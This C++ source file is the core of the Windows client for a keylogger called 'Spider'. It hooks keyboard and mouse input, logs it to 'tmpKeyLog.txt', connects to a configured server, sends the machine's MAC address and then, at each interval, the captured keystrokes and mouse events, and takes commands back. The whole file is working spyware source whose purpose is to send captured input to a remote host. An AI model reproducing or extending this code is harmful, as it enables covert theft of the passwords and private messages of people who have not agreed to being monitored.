#include "Core.h"
#include "HandleHook.h"
#include "HandleThreadSocket.h"
#include "WSocket.h"
#include "IMutex.h"
#include "FileLog.h"


Core::Core(const std::string & _ip, unsigned int _port)
{
	socket = NULL;
	h = NULL;
	file = NULL;
	timeout = 5.0;
	ip = _ip;
	port = _port;
	step = CLIENT_DISCONNECT;
	mutex = new WMutex();
}

Core::~Core()
{

	if (file)
		delete(file);
	if (socket)
		delete(socket);
}

bool Core::initialize(void)
{
#ifdef WIN32
	socket = new WSocket();
	std::cout << "[Spider] Running on Windows..." << std::endl;
#else //Unix
	std::cout << "[Spider] Running on UNIX system..." << std::endl;
	std::cerr << "[Spider - ERROR] Client not implemented for UNIX system." << std::endl;
	return false;
#endif
	file = new FileLog();
	h = new HandleThreadSocket(this);
	file->initialize("tmpKeyLog.txt");
	socket->newSock(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (mutex->initialize())
		return false;
	return true;
}

bool Core::tryConnect()
{
	bool error = false;
	char *t = NULL;

	if (getState() == CLIENT_DISCONNECT)
	{
		setState(CLIENT_WAIT_FOR_CONNECT);
		h->connectSocket(ip, port);
	}

	if (getState() == CLIENT_CONNECTED)
	{
		t = cmd.getCmd("mac", NULL, 0);
		//std::cout << "Packet mac : " << cmd.getIdPacket(t);
		h->sendData(t, cmd.getTotalSize(t));
		t = cmd.getCmd("version", NULL, 0);
		//std::cout << "Packet version : " << cmd.getIdPacket(t);
		h->sendData(t, cmd.getTotalSize(t));
		t = cmd.getCmd("connect", NULL, 0);
		//std::cout << "Packet connect : " << cmd.getIdPacket(t);
		h->sendData(t, cmd.getTotalSize(t));
		setState(CLIENT_SENDED_CMD);
	}
	return true;
}

bool Core::getReturn()
{
	if (getState() >= CLIENT_PROTOCOL_OK)
		return true;
	unsigned int ret = 0;
	char * fullpacket = NULL;
	if (h->getNbThreadRecv() == 0)
		h->receiveData();
	if (!(fullpacket = getResponse()))
		return false;

	h->decNbThreadRecv();
	// if client trying to connect
	if (getState() == CLIENT_SENDED_CMD)
	{
		ret = cmd.interpretAction(fullpacket);
		char * tmp2 = cmd.getPreviousPacket(cmd.getIdResponse(fullpacket), false);
		if (tmp2 != NULL && cmd.getOpcode(tmp2) == 3 && ret == 0)
		{
			setState(CLIENT_PROTOCOL_OK);
			std::cout << "Connexion to the server OK." << std::endl;
			time.start();
		}
	}
	// if it receives data normaly
	else if (getState() == CLIENT_PROTOCOL_OK)
	{
		ret = cmd.interpretAction(fullpacket);
		if (ret >= 0 && ret <= 3)
		{
			// Mute or UnMute the server
			std::cout << "Command to mute/unmute the server (Not implemented)." << std::endl;
		}
		else
			_toSend.push_back(cmd.getCmd("pong", NULL, 0));
	}
	delete(fullpacket);
	return true;
}

bool Core::SendCommand()
{
	while (!_toSend.empty())
	{
		if (!h->sendData(_toSend[0], cmd.getTotalSize(_toSend[0])))
			return false;
		_toSend.erase(_toSend.begin());
	}
	return true;
}

// Read from file and send to server
bool Core::SendFile()
{
	std::list<Input *> _input = file->getInput();
	char *resultats = NULL, *resultats2 = NULL;
	if (cmd.getArrayInput(_input))
	{
		resultats = cmd.getMouseInput();
		resultats2 = cmd.getKeyboardInput();
	}
	if (resultats || resultats2)
		try {	
			if (resultats){
				std::cout << "[Mouse INPUT] Send of " << cmd.getTotalSize(resultats) <<  " bytes " << std::endl;
				if (!h->sendData(resultats, cmd.getTotalSize(resultats)))
					throw std::exception(" Fail to send Mouse input");
			}
			if (resultats2) {
				std::cout << "[Keyboard INPUT] Send of  " << cmd.getTotalSize(resultats2) << " bytes " << std::endl;
				if (!h->sendData(resultats2, cmd.getTotalSize(resultats2)))
					throw std::exception(" Fail to send Keyboard Input");
			}
			std::cout << "Sended ... Cleaning list" << std::endl;

			unsigned int total = cmd.getRestList();
			std::cout << "total " << total << std::endl;
			for (unsigned int i = 0; i < total && !_input.empty(); i++)
			{
				delete(_input.back());
				_input.pop_back();
			}
			while (!_input.empty())
			{
				file->addInput(*_input.back());
				delete(_input.back());
				_input.pop_back();
			}
			if (resultats)
				delete(resultats);
			if (resultats2)
				delete(resultats2);
			time.start();
		}
		catch (const std::exception & msg)
		{
			std::cerr << "[ERROR] Send failed. Input back to file : " << msg.what() << std::endl;
			// Si erreur, on remet les inputs dans le fichier
			while (!_input.empty())
			{
				file->addInput(*_input.back());
				delete(_input.back());
				_input.pop_back();
			}
		return false;
		}
	return true;
}

bool Core::loop(void)
{
	HandleHook ho;
	ho.initialize(timeout);
	while (ho.getMessage())
	{
		
		// si hors ligne et toutes les 60secs
		if (getState() != CLIENT_PROTOCOL_OK 
			&& time.getElapsedTimeInSec() >= timeout)
			tryConnect();
		// si en ligne, toutes les 60 secs
		else if (getState() == CLIENT_PROTOCOL_OK
			&& time.getElapsedTimeInSec() >= timeout)
		{
			SendCommand();
			SendFile();
		}

		if (getState() >= CLIENT_CONNECTED)
			getReturn();
		ho.transAndDispatch();
	}
	return true;
}

ISocketHandler * Core::getSocket() const
{
	return socket;
}

Command & Core::getCommand()
{
	return cmd;
}

int Core::getState()
{
	mutex->lock();
	int s = step;
	mutex->unlock();
	return s;
}

void Core::setState(int s)
{
	mutex->lock();
	step = s;
	mutex->unlock();
}

char * Core::getResponse()
{
	mutex->lock();
	char *s;
	if (_recv.size() > 0)
	{
		s = _recv[0];
		_recv.erase(_recv.begin());
	}
	else
		s = NULL;
	mutex->unlock();
	return s;
}

void Core::addResponse(char * s)
{
	mutex->lock();
	_recv.push_back(s);
	mutex->unlock();
}